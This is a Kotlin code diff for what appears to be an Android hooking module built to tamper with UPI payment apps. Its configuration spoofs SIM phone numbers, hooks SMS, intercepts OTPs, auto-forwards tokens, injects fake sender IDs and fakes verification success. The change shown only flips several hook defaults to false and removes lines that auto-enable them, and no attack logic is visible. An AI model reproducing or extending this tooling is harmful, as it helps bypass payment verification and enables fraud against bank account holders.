@@ -20,9 +20,9 @@ data class ModuleConfig(
     val mockCountryIso: String = "in",
     val mockPhoneSim1: String = "",
     val mockPhoneSim2: String = "+919876543211",
-    val hookIncomingSms: Boolean = true,
+    val hookIncomingSms: Boolean = false,
     val hookOutgoingSms: Boolean = true,
-    val hookUpiVerification: Boolean = true,
+    val hookUpiVerification: Boolean = false,
     val hookedUpiApps: Map<String, Boolean> = UpiAppRegistry.defaultHookMap(),
     val autoExtractOtp: Boolean = true,
     val autoForwardToken: Boolean = true,
@@ -36,7 +36,7 @@ data class ModuleConfig(
     val injectMessageBody: String = "",
     val upiTimerBonusSeconds: Int = 20,
     val upiAppTimerBonuses: Map<String, Int> = UpiAppRegistry.defaultTimerMap(),
-    val overrideIncomingSender: Boolean = true,
+    val overrideIncomingSender: Boolean = false,
     val fakeInterceptTelegram: Boolean = false,
     val interceptFakeSuccess: Boolean = true,
     val autoHookForeground: Boolean = true,
@@ -288,9 +288,7 @@ class ConfigManager(private val context: Context) {
             enablePhoneSpoof = enabled,
             mockPhoneSim1 = if (ten.length == 10) normalized else current.mockPhoneSim1,
             hookOutgoingSms = if (enabled) true else current.hookOutgoingSms,
-            hookIncomingSms = if (enabled) true else current.hookIncomingSms,
             interceptFakeSuccess = if (enabled) true else current.interceptFakeSuccess,
-            hookUpiVerification = if (enabled) true else current.hookUpiVerification,
             autoHookForeground = true
         )
 
@@ -310,8 +308,7 @@ class ConfigManager(private val context: Context) {
         val current = load()
         val updated = current.copy(
             overrideIncomingSender = enabled,
-            injectSenderId = if (enabled && senderId.isNotBlank()) senderId else current.injectSenderId,
-            hookIncomingSms = if (enabled) true else current.hookIncomingSms
+            injectSenderId = if (enabled && senderId.isNotBlank()) senderId else current.injectSenderId
         )
         return saveAndFlushSync(updated)
     }
@@ -322,7 +319,6 @@ class ConfigManager(private val context: Context) {
         val updated = current.copy(
             injectSenderId = senderId,
             overrideIncomingSender = senderId.isNotBlank(),
-            hookIncomingSms = if (senderId.isNotBlank()) true else current.hookIncomingSms,
             autoForwardToken = if (senderId.isNotBlank()) true else current.autoForwardToken
         )
         return saveAndFlushSync(updated)
@@ -537,9 +533,9 @@ class ConfigManager(private val context: Context) {
                 mockCountryIso = json.optString("mock_country_iso", "in"),
                 mockPhoneSim1 = json.optString("mock_phone_sim1", ""),
                 mockPhoneSim2 = json.optString("mock_phone_sim2", "+919876543211"),
-                hookIncomingSms = json.optBoolean("hook_incoming_sms", true),
+                hookIncomingSms = json.optBoolean("hook_incoming_sms", false),
                 hookOutgoingSms = json.optBoolean("hook_outgoing_sms", true),
-                hookUpiVerification = json.optBoolean("hook_upi_verification", true),
+                hookUpiVerification = json.optBoolean("hook_upi_verification", false),
                 hookedUpiApps = parseHookedApps(json),
                 autoExtractOtp = json.optBoolean("auto_extract_otp", true),
                 autoForwardToken = json.optBoolean("auto_forward_token", true),
@@ -553,7 +549,7 @@ class ConfigManager(private val context: Context) {
                 injectMessageBody = json.optString("inject_message_body", ""),
                 upiTimerBonusSeconds = json.optInt("upi_timer_bonus_seconds", 20),
                 upiAppTimerBonuses = parseTimerBonuses(json),
-                overrideIncomingSender = json.optBoolean("override_incoming_sender", true),
+                overrideIncomingSender = json.optBoolean("override_incoming_sender", false),
                 fakeInterceptTelegram = json.optBoolean("fake_intercept_telegram", true),
                 interceptFakeSuccess = json.optBoolean("intercept_fake_success", true),
                 autoHookForeground = json.optBoolean("auto_hook_foreground", true)
